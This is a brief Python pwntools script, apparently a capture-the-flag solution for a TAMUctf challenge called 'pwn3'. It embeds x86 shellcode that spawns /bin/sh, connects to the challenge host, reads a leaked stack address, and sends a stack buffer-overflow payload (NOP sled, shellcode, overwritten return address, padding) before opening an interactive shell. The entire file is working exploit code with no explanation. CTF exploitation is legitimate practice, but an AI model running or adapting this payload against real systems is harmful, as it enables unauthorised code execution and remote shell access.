from pwn import *

s = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

#r = process("./pwn3")
r = remote("pwn.tamuctf.com",4323)
pause()

leak = r.recv().split()[-1][:-1]

payload = ""
payload += "\x90"*(24-len(s))
payload += s
payload += p32(int(leak,16))
payload += "\x90"*22
payload += "C"*248
payload += "DDDD"
r.sendline(payload)
r.interactive()
